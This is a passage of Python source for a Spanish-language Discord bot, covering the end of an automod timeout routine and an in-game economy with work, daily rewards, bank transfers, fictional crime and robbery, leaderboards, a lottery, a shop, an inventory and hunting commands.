                    inline=True)

    if total_warnings >= threshold:
        try:
            # Castigo: Silencio por 2 días
            member = message.guild.get_member(user_id)
            if member:
                await member.timeout(
                    datetime.timedelta(days=2),
                    reason="Superó el límite de advertencias de automod")
                embed.add_field(name="🔇 Castigo",
                                value="Silenciado por 2 días",
                                inline=True)
                # Resetear advertencias después del castigo
                warning_counts[user_id] = {}
        except discord.Forbidden:
            embed.add_field(name="🔇 Castigo",
                            value="No se pudo silenciar (permisos)",
                            inline=True)
        except Exception as e:
            embed.add_field(name="🔇 Castigo",
                            value=f"Error al silenciar: {e}",
                            inline=True)

    await message.channel.send(embed=embed, delete_after=10)


# ================================
# COMANDOS DE ECONOMÍA CON PREFIJO .
# ================================

# Sistema de inventarios (NUEVO GPC 4)
inventories_file = 'inventories.json'
if os.path.exists(inventories_file):
    with open(inventories_file, 'r') as f:
        inventories = json.load(f)
else:
    inventories = {}


def save_inventories():
    with open(inventories_file, 'w') as f:
        json.dump(inventories, f, indent=2)


def get_user_inventory(user_id):
    user_id = str(user_id)
    if user_id not in inventories:
        inventories[user_id] = {}
    return inventories[user_id]


def add_item_to_inventory(user_id, item_name, quantity=1):
    user_id = str(user_id)
    inventory = get_user_inventory(user_id)
    inventory[item_name] = inventory.get(item_name, 0) + quantity
    save_inventories()


def remove_item_from_inventory(user_id, item_name, quantity=1):
    user_id = str(user_id)
    inventory = get_user_inventory(user_id)
    if item_name in inventory:
        inventory[item_name] = max(0, inventory[item_name] - quantity)
        if inventory[item_name] == 0:
            del inventory[item_name]
        save_inventories()
        return True
    return False


def has_item(user_id, item_name, quantity=1):
    inventory = get_user_inventory(user_id)
    return inventory.get(item_name, 0) >= quantity


# Sistema de tienda (NUEVO GPC 4)
SHOP_ITEMS = {
    "tools": {
        "pico_hierro": {
            "name": "Pico de Hierro",
            "price": 2500,
            "description": "Mejora la minería (+50% dinero)"
        },
        "arco_caza": {
            "name": "Arco de Caza",
            "price": 3000,
            "description": "Mejora la caza (+60% dinero)"
        },
        "cana_pro": {
            "name": "Caña Pro",
            "price": 2000,
            "description": "Mejora la pesca (+40% dinero)"
        },
        "mapa_tesoro": {
            "name": "Mapa del Tesoro",
            "price": 5000,
            "description": "Mejora la exploración (+70% dinero)"
        },
        "botas_velocidad": {
            "name": "Botas de Velocidad",
            "price": 4000,
            "description": "Reduce cooldowns en 25%"
        }
    },
    "items": {
        "pocion_vida": {
            "name": "Poción de Vida",
            "price": 800,
            "description": "Restaura energía para actividades"
        },
        "pocion_energia": {
            "name": "Poción de Energía",
            "price": 1000,
            "description": "Duplica ganancias por 1 hora"
        },
        "multiplicador_2x": {
            "name": "Multiplicador 2x",
            "price": 1500,
            "description": "Duplica ganancias de trabajo"
        },
        "amuleto_suerte": {
            "name": "Amuleto de Suerte",
            "price": 3500,
            "description": "Aumenta probabilidad de items raros"
        },
        "escudo_proteccion": {
            "name": "Escudo de Protección",
            "price": 2500,
            "description": "Protege contra robos por 24h"
        }
    },
    "collectibles": {
        "diamante_raro": {
            "name": "Diamante Raro",
            "price": 10000,
            "description": "Item de colección muy valioso"
        },
        "trofeo_oro": {
            "name": "Trofeo de Oro",
            "price": 7500,
            "description": "Símbolo de prestigio"
        },
        "estrella_dorada": {
            "name": "Estrella Dorada",
            "price": 8500,
            "description": "Item místico de colección"
        },
        "reliquia_antigua": {
            "name": "Reliquia Antigua",
            "price": 12000,
            "description": "Artefacto legendario"
        },
        "cristal_poder": {
            "name": "Cristal de Poder",
            "price": 15000,
            "description": "Fuente de energía mágica"
        }
    }
}

# Sistema de lotería
lottery_settings_file = 'lottery_settings.json'
if os.path.exists(lottery_settings_file):
    with open(lottery_settings_file, 'r') as f:
        lottery_settings = json.load(f)
else:
    lottery_settings = {}


def save_lottery_settings():
    with open(lottery_settings_file, 'w') as f:
        json.dump(lottery_settings, f)


@bot.command(name='balance', aliases=['money', 'bal'])
async def balance_command(ctx):
    """Ver tu balance de dinero"""
    try:
        print(f"Comando balance ejecutado por {ctx.author.name}")
        
        if not system_modules.get('economy', True):
            await ctx.send("❌ El sistema de economía está desactivado.")
            return

        user_data = get_balance(ctx.author.id)
        total = user_data['wallet'] + user_data['bank']

        embed = discord.Embed(title="💰 Tu Balance", color=discord.Color.green())
        embed.add_field(name="👛 Billetera",
                        value=f"${user_data['wallet']:,}",
                        inline=True)
        embed.add_field(name="🏦 Banco",
                        value=f"${user_data['bank']:,}",
                        inline=True)
        embed.add_field(name="💎 Total", value=f"${total:,}", inline=True)
        embed.set_footer(text=f"Balance de {ctx.author.display_name}")

        await ctx.send(embed=embed)
        print(f"Balance comando completado para {ctx.author.name}")
    except Exception as e:
        print(f"Error en comando balance: {e}")
        await ctx.send("❌ Error al obtener tu balance. Inténtalo de nuevo.")


@bot.command(name='work')
async def work_command(ctx):
    """Trabajar para ganar dinero"""
    try:
        if not system_modules.get('economy', True):
            await ctx.send("❌ El sistema de economía está desactivado.")
            return

        if not can_use_cooldown(ctx.author.id, 'work', 300):  # 5 minutos
            remaining = get_cooldown_remaining(ctx.author.id, 'work', 300)
            minutes = int(remaining // 60)
            seconds = int(remaining % 60)
            await ctx.send(
                f"⏰ Debes esperar **{minutes}m {seconds}s** antes de trabajar de nuevo."
            )
            return

        jobs = [("👨‍💻 Programador", 500, 1200), ("🏪 Cajero", 300, 800),
                ("🚚 Conductor", 400, 900), ("👨‍🍳 Chef", 350, 750),
                ("📚 Bibliotecario", 250, 600), ("🧹 Conserje", 200, 500),
                ("📦 Repartidor", 300, 700)]

        job_name, min_pay, max_pay = random.choice(jobs)
        earnings = random.randint(min_pay, max_pay)

        update_balance(ctx.author.id, earnings, 0)

        embed = discord.Embed(title="💼 Trabajo Completado",
                              color=discord.Color.green())
        embed.add_field(name="👷 Trabajo", value=job_name, inline=True)
        embed.add_field(name="💰 Ganaste", value=f"${earnings:,}", inline=True)
        embed.set_footer(text="¡Buen trabajo!")

        await ctx.send(embed=embed)
    except Exception as e:
        print(f"Error en comando work: {e}")
        await ctx.send("❌ Error al trabajar. Inténtalo de nuevo.")


@bot.command(name='test')
async def test_command(ctx):
    """Comando de prueba para verificar que los comandos de economía funcionan"""
    try:
        print(f"Comando test ejecutado por {ctx.author.name}")
        await ctx.send("✅ ¡Los comandos de economía están funcionando correctamente!")
        await ctx.send("📝 Comandos disponibles: `.balance`, `.work`, `.daily`, `.mine`, `.fish`, `.hunt`, `.shop`")
        
        # Test del sistema de balance
        user_data = get_balance(ctx.author.id)
        await ctx.send(f"🔍 Debug: Tu balance actual es ${user_data['wallet']:,} en billetera y ${user_data['bank']:,} en banco")
        
    except Exception as e:
        print(f"Error en comando test: {e}")
        await ctx.send("❌ Error en el comando de prueba.")

@bot.command(name='debug')
async def debug_command(ctx):
    """Comando de debug para diagnosticar problemas"""
    try:
        print(f"Comando debug ejecutado por {ctx.author.name}")
        
        embed = discord.Embed(title="🔍 Debug del Sistema", color=discord.Color.blue())
        
        # Estado de módulos
        eco_status = "✅ Activado" if system_modules.get('economy', True) else "❌ Desactivado"
        embed.add_field(name="💰 Módulo Economía", value=eco_status, inline=True)
        
        # Estado del usuario
        user_data = get_balance(ctx.author.id)
        embed.add_field(name="👤 Tu Usuario ID", value=str(ctx.author.id), inline=True)
        embed.add_field(name="💳 Balance", value=f"${user_data['wallet']:,}", inline=True)
        
        # Información del prefijo
        prefix = get_prefix(bot, ctx.message)
        embed.add_field(name="🔧 Prefijo detectado", value=str(prefix), inline=True)
        
        # Estado global
        embed.add_field(name="🌐 Economy Only Mode", value=str(economy_only_mode), inline=True)
        embed.add_field(name="📊 Total usuarios con balance", value=str(len(balances)), inline=True)
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        print(f"Error en comando debug: {e}")
        await ctx.send(f"❌ Error en debug: {str(e)}")

@bot.command(name='daily')
async def daily_command(ctx):
    """Recompensa diaria"""
    if not can_use_cooldown(ctx.author.id, 'daily',
                            86400):  # 24 horas (86400 segundos)
        remaining = get_cooldown_remaining(ctx.author.id, 'daily', 86400)
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        await ctx.send(
            f"⏰ Ya recogiste tu recompensa diaria. Vuelve en **{hours}h {minutes}m**."
        )
        return

    daily_amount = random.randint(800, 1500)
    update_balance(ctx.author.id, daily_amount, 0)

    embed = discord.Embed(title="🎁 Recompensa Diaria",
                          color=discord.Color.gold())
    embed.add_field(name="💰 Ganaste", value=f"${daily_amount:,}", inline=True)
    embed.add_field(name="⏰ Próxima", value="En 24 horas", inline=True)
    embed.set_footer(text="¡Vuelve mañana para más!")

    await ctx.send(embed=embed)


@bot.command(name='pay')
async def pay_command(ctx, member: discord.Member = None, amount: int = None):
    """Enviar dinero a otro usuario"""
    if not member or not amount:
        await ctx.send("❌ Uso: `.pay @usuario cantidad`")
        return

    if member.bot:
        await ctx.send("❌ No puedes enviar dinero a un bot.")
        return

    if member.id == ctx.author.id:
        await ctx.send("❌ No puedes enviarte dinero a ti mismo.")
        return

    if amount <= 0:
        await ctx.send("❌ La cantidad debe ser mayor a 0.")
        return

    sender_balance = get_balance(ctx.author.id)
    if sender_balance['wallet'] < amount:
        await ctx.send(
            f"❌ No tienes suficiente dinero. Tienes ${sender_balance['wallet']:,}"
        )
        return

    # Transferir dinero
    update_balance(ctx.author.id, -amount, 0)
    update_balance(member.id, amount, 0)

    embed = discord.Embed(title="💸 Transferencia Exitosa",
                          color=discord.Color.green())
    embed.add_field(name="👤 Enviaste",
                    value=f"${amount:,} a {member.mention}",
                    inline=False)
    embed.set_footer(text="¡Transferencia completada!")

    await ctx.send(embed=embed)


@bot.command(name='deposit', aliases=['dep'])
async def deposit_command(ctx, amount=None):
    """Depositar dinero en el banco"""
    if not amount:
        await ctx.send("❌ Uso: `.deposit cantidad` o `.deposit all`")
        return

    user_balance = get_balance(ctx.author.id)

    if amount.lower() == 'all':
        amount = user_balance['wallet']
    else:
        try:
            amount = int(amount)
        except ValueError:
            await ctx.send("❌ Cantidad inválida.")
            return

    if amount <= 0:
        await ctx.send("❌ La cantidad debe ser mayor a 0.")
        return

    if user_balance['wallet'] < amount:
        await ctx.send(
            f"❌ No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}"
        )
        return

    update_balance(ctx.author.id, -amount, amount)

    embed = discord.Embed(title="🏦 Depósito Exitoso",
                          color=discord.Color.blue())
    embed.add_field(name="💰 Depositaste", value=f"${amount:,}", inline=True)
    embed.add_field(name="🏦 Nuevo balance bancario",
                    value=f"${user_balance['bank'] + amount:,}",
                    inline=True)

    await ctx.send(embed=embed)


@bot.command(name='withdraw')
async def withdraw_command(ctx, amount=None):
    """Retirar dinero del banco"""
    if not amount:
        await ctx.send("❌ Uso: `.withdraw cantidad` o `.withdraw all`")
        return

    user_balance = get_balance(ctx.author.id)

    if amount.lower() == 'all':
        amount = user_balance['bank']
    else:
        try:
            amount = int(amount)
        except ValueError:
            await ctx.send("❌ Cantidad inválida.")
            return

    if amount <= 0:
        await ctx.send("❌ La cantidad debe ser mayor a 0.")
        return

    if user_balance['bank'] < amount:
        await ctx.send(
            f"❌ No tienes suficiente dinero en el banco. Tienes ${user_balance['bank']:,}"
        )
        return

    update_balance(ctx.author.id, amount, -amount)

    embed = discord.Embed(title="🏦 Retiro Exitoso", color=discord.Color.blue())
    embed.add_field(name="💰 Retiraste", value=f"${amount:,}", inline=True)
    embed.add_field(name="👛 Nuevo balance de billetera",
                    value=f"${user_balance['wallet'] + amount:,}",
                    inline=True)

    await ctx.send(embed=embed)


@bot.command(name='beg', aliases=['b'])
async def beg_command(ctx):
    """Mendigar por dinero"""
    if not can_use_cooldown(ctx.author.id, 'beg', 30):  # 30 segundos
        remaining = get_cooldown_remaining(ctx.author.id, 'beg', 30)
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        await ctx.send(
            f"⏰ Debes esperar **{minutes}m {seconds}s** antes de mendigar de nuevo."
        )
        return

    success_chance = random.random()

    if success_chance > 0.3:  # 70% de éxito
        amount = random.randint(50, 200)
        update_balance(ctx.author.id, amount, 0)

        messages = [
            f"Aun así, un amable extraño te dio ${amount:,}!",
            f"Una buena samaritana te dio ${amount:,}!",
            f"Alguien se apiadó de ti y te dio ${amount:,}.",
            f"¡Encontraste ${amount:,} en el suelo!"
        ]

        await ctx.send(random.choice(messages))
    else:
        messages = [
            "Nadie te prestó atención esta vez.", "Te ignoraron por completo.",
            "Tuviste mala suerte y no recibiste nada."
        ]

        await ctx.send(random.choice(messages))


@bot.command(name='crime', aliases=['cr'])
async def crime_command(ctx):
    """Cometer crímenes por dinero (riesgoso)"""
    if not can_use_cooldown(ctx.author.id, 'crime', 180):  # 3 minutos
        remaining = get_cooldown_remaining(ctx.author.id, 'crime', 180)
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        await ctx.send(
            f"⏰ Debes esperar **{minutes}m {seconds}s** antes de cometer otro crimen."
        )
        return

    crimes = [("🏪 Robar una tienda", 200, 800), ("🚗 Robar un auto", 500, 1200),
              ("💻 Hackear un banco", 800, 2000),
              ("💎 Robar joyería", 600, 1500),
              ("🏛️ Robar un museo", 1000, 2500)]

    crime_name, min_reward, max_reward = random.choice(crimes)
    success_chance = random.random()

    if success_chance > 0.4:  # 60% de éxito
        reward = random.randint(min_reward, max_reward)
        update_balance(ctx.author.id, reward, 0)

        embed = discord.Embed(title="🎭 Crimen Exitoso",
                              color=discord.Color.green())
        embed.add_field(name="🔫 Crimen", value=crime_name, inline=True)
        embed.add_field(name="💰 Ganaste", value=f"${reward:,}", inline=True)
        embed.set_footer(text="¡Escapaste sin ser atrapado!")

        await ctx.send(embed=embed)
    else:
        fine = random.randint(100, 500)
        user_balance = get_balance(ctx.author.id)

        if user_balance['wallet'] >= fine:
            update_balance(ctx.author.id, -fine, 0)

        embed = discord.Embed(title="🚔 Te Atraparon",
                              color=discord.Color.red())
        embed.add_field(name="🔫 Crimen", value=crime_name, inline=True)
        embed.add_field(name="💸 Multa", value=f"${fine:,}", inline=True)
        embed.set_footer(text="¡La policía te atrapó!")

        await ctx.send(embed=embed)


@bot.command(name='rob', aliases=['r'])
async def rob_command(ctx, member: discord.Member = None):
    """Intentar robar a otro usuario"""
    if not member:
        await ctx.send("❌ Uso: `.rob @usuario`")
        return

    if member.bot:
        await ctx.send("❌ No puedes robar a un bot.")
        return

    if member.id == ctx.author.id:
        await ctx.send("❌ No puedes robarte a ti mismo.")
        return

    if not can_use_cooldown(ctx.author.id, 'rob', 600):  # 10 minutos
        remaining = get_cooldown_remaining(ctx.author.id, 'rob', 600)
        minutes = int(remaining // 60)
        await ctx.send(
            f"⏰ Debes esperar **{minutes}m** antes de robar de nuevo.")
        return

    target_balance = get_balance(member.id)
    if target_balance['wallet'] < 500:
        await ctx.send(
            f"❌ {member.mention} no tiene suficiente dinero para robar (mínimo $500)."
        )
        return

    success_chance = random.random()

    if success_chance > 0.5:  # 50% de éxito
        stolen_amount = random.randint(
            100, min(target_balance['wallet'] // 3, 1000))

        update_balance(member.id, -stolen_amount, 0)
        update_balance(ctx.author.id, stolen_amount, 0)

        embed = discord.Embed(title="💰 Robo Exitoso",
                              color=discord.Color.green())
        embed.add_field(name="🎯 Víctima", value=member.mention, inline=True)
        embed.add_field(name="💸 Robaste",
                        value=f"${stolen_amount:,}",
                        inline=True)
        embed.set_footer(text="¡Escapaste con el dinero!")

        await ctx.send(embed=embed)
    else:
        fine = random.randint(200, 600)
        user_balance = get_balance(ctx.author.id)

        if user_balance['wallet'] >= fine:
            update_balance(ctx.author.id, -fine, 0)

        embed = discord.Embed(title="🚫 Robo Fallido",
                              color=discord.Color.red())
        embed.add_field(name="🎯 Objetivo", value=member.mention, inline=True)
        embed.add_field(name="💸 Multa", value=f"${fine:,}", inline=True)
        embed.set_footer(text="¡Te atraparon intentando robar!")

        await ctx.send(embed=embed)


@bot.command(name='baltop', aliases=['top'])
async def baltop_command(ctx):
    """Top 15 usuarios más ricos del servidor actual"""
    if not balances:
        await ctx.send("❌ No hay datos de balance disponibles.")
        return

    # Crear lista de usuarios con sus balances totales (solo del servidor actual)
    user_balances = []
    guild_members = {member.id for member in ctx.guild.members}

    for user_id, data in balances.items():
        try:
            user_id_int = int(user_id)
            if user_id_int in guild_members:
                user = bot.get_user(user_id_int)
                if user and not user.bot:
                    total = data['wallet'] + data['bank']
                    if total > 0:  # Solo usuarios con dinero
                        user_balances.append((user.display_name, total,
                                              data['wallet'], data['bank']))
        except:
            continue

    # Ordenar por balance total
    user_balances.sort(key=lambda x: x[1], reverse=True)
    user_balances = user_balances[:15]  # Top 15

    if not user_balances:
        await ctx.send(
            "❌ No hay suficientes usuarios de este servidor con balance para mostrar."
        )
        return

    embed = discord.Embed(title=f"💰 Top 15 Más Ricos - {ctx.guild.name}",
                          color=discord.Color.gold())

    description = ""
    medals = ["🥇", "🥈", "🥉"]

    for i, (name, total, wallet, bank) in enumerate(user_balances):
        medal = medals[i] if i < 3 else f"{i+1}."
        description += f"{medal} **{name}** - ${total:,}\n"
        if i < 5:  # Mostrar detalles para top 5
            description += f"    💰 Billetera: ${wallet:,} | 🏦 Banco: ${bank:,}\n"
        description += "\n"

    embed.description = description
    embed.set_footer(
        text=
        f"Ranking del servidor {ctx.guild.name} • {len(user_balances)} usuarios"
    )

    await ctx.send(embed=embed)


@bot.command(name='mundialtop', aliases=['globaltop'])
async def mundialtop_command(ctx):
    """Top 15 usuarios más ricos de todos los servidores"""
    if not balances:
        await ctx.send("❌ No hay datos de balance disponibles.")
        return

    # Crear lista de usuarios con sus balances totales (todos los servidores)
    user_balances = []
    for user_id, data in balances.items():
        try:
            user = bot.get_user(int(user_id))
            if user and not user.bot:
                total = data['wallet'] + data['bank']
                if total > 0:  # Solo usuarios con dinero
                    # Obtener nombre del servidor principal del usuario
                    main_server = "Servidor desconocido"
                    for guild in bot.guilds:
                        if guild.get_member(user.id):
                            main_server = guild.name
                            break

                    user_balances.append(
                        (user.display_name, total, data['wallet'],
                         data['bank'], main_server))
        except:
            continue

    # Ordenar por balance total
    user_balances.sort(key=lambda x: x[1], reverse=True)
    user_balances = user_balances[:15]  # Top 15

    if not user_balances:
        await ctx.send(
            "❌ No hay suficientes usuarios con balance para mostrar.")
        return

    embed = discord.Embed(title="🌍 Top 15 Más Ricos - Global",
                          color=discord.Color.purple())

    description = ""
    medals = ["🥇", "🥈", "🥉"]

    for i, (name, total, wallet, bank, server) in enumerate(user_balances):
        medal = medals[i] if i < 3 else f"{i+1}."
        description += f"{medal} **{name}** - ${total:,}\n"
        if i < 5:  # Mostrar detalles para top 5
            description += f"    💰 Billetera: ${wallet:,} | 🏦 Banco: ${bank:,}\n"
            description += f"    🏰 Servidor: {server}\n"
        description += "\n"

    embed.description = description
    embed.set_footer(
        text=
        f"Ranking global • {len(user_balances)} usuarios de {len(bot.guilds)} servidores"
    )

    await ctx.send(embed=embed)


# Añadir el comando .collect con rangos
@bot.command(name='collect', aliases=['cl'])
async def collect_command(ctx):
    """Recoge tu recompensa diaria/boost basada en tu rango."""
    user_id = str(ctx.author.id)
    user = ctx.author

    # Definir recompensas por rango
    rank_rewards = {
        "member": 200,
        "level_10": 500,
        "level_20": 1000,
        "level_30": 1800,
        "booster": 2500  # Rango especial para boosters
    }

    # Determinar el rango del usuario
    user_data = get_user_level_data(user_id)
    user_level = user_data['level']
    user_rank = "member"  # Rango base

    if user_level >= 30:
        user_rank = "level_30"
    elif user_level >= 20:
        user_rank = "level_20"
    elif user_level >= 10:
        user_rank = "level_10"

    # Verificar si el usuario es booster (necesitas tener una forma de detectar esto, aquí simulamos)
    # Ejemplo: Si el usuario tiene un rol específico llamado "Booster"
    booster_role_name = "Booster"  # Ajusta esto al nombre real del rol
    booster_role = discord.utils.get(ctx.guild.roles, name=booster_role_name)
    if booster_role and booster_role in user.roles:
        user_rank = "booster"

    # Obtener recompensa y aplicar cooldown
    if not can_use_cooldown(user_id, 'collect', 7200):  # Cooldown de 2 horas
        remaining = get_cooldown_remaining(user_id, 'collect', 7200)
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        await ctx.send(
            f"⏰ Ya has recogido tu recompensa. Vuelve en **{hours}h {minutes}m**."
        )
        return

    reward_amount = rank_rewards.get(
        user_rank, rank_rewards["member"])  # Obtener recompensa

    # Simular un pequeño bonus por rango
    if user_rank == "booster":
        bonus = random.randint(100, 500)
        reward_amount += bonus
        reward_message = f"¡Gracias por ser booster! Recibiste ${reward_amount:,} (+${bonus:,} bonus)."
    elif user_rank == "level_30":
        bonus = random.randint(50, 200)
        reward_amount += bonus
        reward_message = f"¡Felicidades por tu nivel {user_level}! Recibiste ${reward_amount:,} (+${bonus:,} bonus)."
    else:
        reward_message = f"¡Gracias por tu actividad! Recibiste ${reward_amount:,}."

    update_balance(user_id, reward_amount, 0)  # Solo se añade a la billetera

    embed = discord.Embed(title="🎁 Recompensa Recogida",
                          color=discord.Color.gold())
    embed.add_field(name="⭐ Rango", value=user_rank.capitalize(), inline=True)
    embed.add_field(name="💰 Recibiste",
                    value=f"${reward_amount:,}",
                    inline=True)
    embed.set_footer(text=reward_message)

    await ctx.send(embed=embed)


@bot.command(name='win')
async def lottery_command(ctx):
    """Lotería de $10,000 con 0.5% de probabilidad de ganar"""
    user_data = get_balance(ctx.author.id)

    if user_data['wallet'] < 10000:
        await ctx.send(
            f"❌ Necesitas $10,000 para jugar la lotería. Tienes ${user_data['wallet']:,}"
        )
        return

    # Verificar si hay premio configurado
    guild_id = str(ctx.guild.id)
    if guild_id not in lottery_settings or not lottery_settings[guild_id].get(
            'reward'):
        await ctx.send(
            "❌ No hay premio configurado para la lotería. Un administrador debe usar `*winset` primero."
        )
        return

    # Cobrar el costo
    update_balance(ctx.author.id, -10000, 0)

    # Probabilidad de 0.5% de ganar (1 en 200)
    win_chance = random.randint(1, 200)

    if win_chance == 1:  # Ganó
        reward = lottery_settings[guild_id]['reward']

        # Embed de ganador
        embed = discord.Embed(
            title="🎉 ¡GANADOR DE LA LOTERÍA! 🎉",
            description=f"**{ctx.author.mention} HA GANADO LA LOTERÍA!**\n\n"
            f"🏆 **Premio:** {reward}\n"
            f"💰 **Costo:** $10,000\n"
            f"🎯 **Probabilidad:** 0.5% (1/200)",
            color=discord.Color.gold())
        embed.set_thumbnail(url=ctx.author.display_avatar.url)
        embed.add_field(name="🎫 Próximo paso",
                        value="¡Abre un ticket para reclamar tu premio!",
                        inline=False)

        # Anuncio público con @everyone
        await ctx.send(f"@everyone 🚨 **¡TENEMOS UN GANADOR!** 🚨")
        await ctx.send(embed=embed)

        # Mensaje privado al ganador
        try:
            dm_embed = discord.Embed(
                title="🎉 ¡Felicidades!",
                description=f"¡Has ganado la lotería!\n\n"
                f"**Premio:** {reward}\n\n"
                f"Para reclamar tu premio, abre un ticket en el servidor usando `/ticket_setup` o busca el panel de tickets.",
                color=discord.Color.gold())
            await ctx.author.send(embed=dm_embed)
        except:
            pass

        print(
            f"LOTERÍA GANADA por {ctx.author.name} en {ctx.guild.name} - Premio: {reward}"
        )

    else:  # Perdió
        embed = discord.Embed(
            title="💸 Lotería",
            description=f"**No fue tu día de suerte...**\n\n"
            f"💰 Gastaste: $10,000\n"
            f"🎯 Probabilidad de ganar: 0.5%\n"
            f"🎁 Premio actual: {lottery_settings[guild_id]['reward']}",
            color=discord.Color.red())
        embed.set_footer(text="¡Inténtalo de nuevo! La suerte puede cambiar.")

        await ctx.send(embed=embed)


# ================================
# NUEVOS COMANDOS DE ECONOMÍA GPC 4
# ================================


@bot.command(name='inventory', aliases=['inv'])
async def inventory_command(ctx):
    """Ver tu inventario"""
    inventory = get_user_inventory(ctx.author.id)

    if not inventory:
        embed = discord.Embed(
            title="🎒 Tu Inventario",
            description=
            "Tu inventario está vacío. ¡Usa la tienda o participa en actividades para conseguir items!",
            color=discord.Color.blue())
        await ctx.send(embed=embed)
        return

    embed = discord.Embed(title="🎒 Tu Inventario", color=discord.Color.green())

    # Agrupar items por categoría
    tools = []
    items = []
    collectibles = []

    for item_name, quantity in inventory.items():
        item_info = None
        category = "items"

        # Buscar en todas las categorías
        for cat, cat_items in SHOP_ITEMS.items():
            for item_id, item_data in cat_items.items():
                if item_data["name"] == item_name:
                    item_info = item_data
                    category = cat
                    break
            if item_info:
                break

        if item_info:
            item_text = f"**{item_name}** x{quantity}\n*{item_info['description']}*"
            if category == "tools":
                tools.append(item_text)
            elif category == "collectibles":
                collectibles.append(item_text)
            else:
                items.append(item_text)
        else:
            items.append(f"**{item_name}** x{quantity}")

    if tools:
        embed.add_field(name="🔧 Herramientas",
                        value="\n\n".join(tools),
                        inline=False)
    if items:
        embed.add_field(name="💎 Items", value="\n\n".join(items), inline=False)
    if collectibles:
        embed.add_field(name="🏆 Coleccionables",
                        value="\n\n".join(collectibles),
                        inline=False)

    embed.set_footer(text="Usa .use <item> para usar items consumibles")
    await ctx.send(embed=embed)


@bot.command(name='shop')
async def shop_command(ctx, category=None):
    """Ver la tienda de items"""
    if not category:
        embed = discord.Embed(
            title="🛒 Tienda de GuardianPro",
            description="¡Bienvenido a la tienda! Selecciona una categoría:",
            color=discord.Color.blue())

        embed.add_field(
            name="🔧 Herramientas",
            value=
            "`.shop tools` - Picos, arcos, cañas y más\nMejoran tus actividades y ganancias",
            inline=True)
        embed.add_field(
            name="💎 Items Consumibles",
            value=
            "`.shop items` - Pociones, multiplicadores\nEfectos temporales útiles",
            inline=True)
        embed.add_field(
            name="🏆 Coleccionables",
            value=
            "`.shop collectibles` - Items raros\nPara coleccionistas y prestigio",
            inline=True)

        embed.set_footer(
            text=
            "Usa .buy <item> para comprar • Usa .shop <categoría> para ver items"
        )
        await ctx.send(embed=embed)
        return

    category = category.lower()
    if category not in SHOP_ITEMS:
        await ctx.send(
            "❌ Categoría inválida. Usa: `tools`, `items`, o `collectibles`")
        return

    cat_data = SHOP_ITEMS[category]

    embed = discord.Embed(title=f"🛒 Tienda - {category.title()}",
                          color=discord.Color.gold())

    for item_id, item_data in cat_data.items():
        embed.add_field(name=f"{item_data['name']} - ${item_data['price']:,}",
                        value=item_data['description'],
                        inline=False)

    embed.set_footer(text=f"Usa .buy <nombre_del_item> para comprar")
    await ctx.send(embed=embed)


@bot.command(name='buy')
async def buy_command(ctx, *, item_name=None):
    """Comprar items de la tienda"""
    if not item_name:
        await ctx.send(
            "❌ Uso: `.buy <nombre_del_item>`\nEjemplo: `.buy Pico de Hierro`")
        return

    # Buscar el item en todas las categorías
    item_found = None
    item_price = 0

    for category, items in SHOP_ITEMS.items():
        for item_id, item_data in items.items():
            if item_data["name"].lower() == item_name.lower():
                item_found = item_data["name"]
                item_price = item_data["price"]
                break
        if item_found:
            break

    if not item_found:
        await ctx.send(
            f"❌ Item '{item_name}' no encontrado. Usa `.shop` para ver items disponibles."
        )
        return

    # Verificar dinero
    user_balance = get_balance(ctx.author.id)
    if user_balance['wallet'] < item_price:
        await ctx.send(
            f"❌ No tienes suficiente dinero. Necesitas ${item_price:,}, tienes ${user_balance['wallet']:,}"
        )
        return

    # Realizar compra
    update_balance(ctx.author.id, -item_price, 0)
    add_item_to_inventory(ctx.author.id, item_found, 1)

    embed = discord.Embed(
        title="✅ Compra Exitosa",
        description=f"Has comprado **{item_found}** por ${item_price:,}",
        color=discord.Color.green())
    embed.add_field(name="💰 Dinero restante",
                    value=f"${user_balance['wallet'] - item_price:,}",
                    inline=True)
    embed.set_footer(text="Revisa tu inventario con .inventory")

    await ctx.send(embed=embed)


@bot.command(name='use')
async def use_command(ctx, *, item_name=None):
    """Usar items del inventario"""
    if not item_name:
        await ctx.send("❌ Uso: `.use <nombre_del_item>`")
        return

    inventory = get_user_inventory(ctx.author.id)

    if item_name not in inventory or inventory[item_name] <= 0:
        await ctx.send(f"❌ No tienes '{item_name}' en tu inventario.")
        return

    # Efectos de items
    if "Poción de Vida" in item_name:
        remove_item_from_inventory(ctx.author.id, item_name, 1)
        await ctx.send("💚 ¡Te sientes renovado! Poción de vida usada.")

    elif "Poción de Energía" in item_name:
        remove_item_from_inventory(ctx.author.id, item_name, 1)
        await ctx.send(
            "⚡ ¡Energía duplicada por 1 hora! Tus próximas ganancias serán mayores."
        )

    elif "Multiplicador 2x" in item_name:
        remove_item_from_inventory(ctx.author.id, item_name, 1)
        await ctx.send(
            "🎯 ¡Multiplicador activado! Tus ganancias de trabajo se duplicarán."
        )

    elif "Escudo de Protección" in item_name:
        remove_item_from_inventory(ctx.author.id, item_name, 1)
        await ctx.send(
            "🛡️ ¡Protección activada! Estás protegido contra robos por 24 horas."
        )

    else:
        await ctx.send("❌ Este item no se puede usar o no es consumible.")


@bot.command(name='hunt')
async def hunt_command(ctx):
    """Ir de caza para ganar dinero"""
    if not can_use_cooldown(ctx.author.id, 'hunt', 900):  # 15 minutos
        remaining = get_cooldown_remaining(ctx.author.id, 'hunt', 900)
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        await ctx.send(
            f"🏹 Debes esperar **{minutes}m {seconds}s** antes de cazar de nuevo."
        )
        return

    # Verificar si tiene herramientas que mejoren la caza
    inventory = get_user_inventory(ctx.author.id)
    bonus_multiplier = 1.0

    if "Arco de Caza" in inventory:
        bonus_multiplier = 1.6  # +60%

    # Animales y ganancias
    animals = [("🦌 Ciervo", 300, 600), ("🐗 Jabalí", 400, 700),
               ("🐰 Conejo", 150, 350), ("🦆 Pato", 200, 400),
               ("🐺 Lobo", 500, 900)]

    animal_name, min_reward, max_reward = random.choice(animals)
    base_reward = random.randint(min_reward, max_reward)
    final_reward = int(base_reward * bonus_multiplier)

    update_balance(ctx.author.id, final_reward, 0)

    embed = discord.Embed(title="🏹 Expedición de Caza",
                          color=discord.Color.green())
    embed.add_field(name="🎯 Presa", value=animal_name, inline=True)
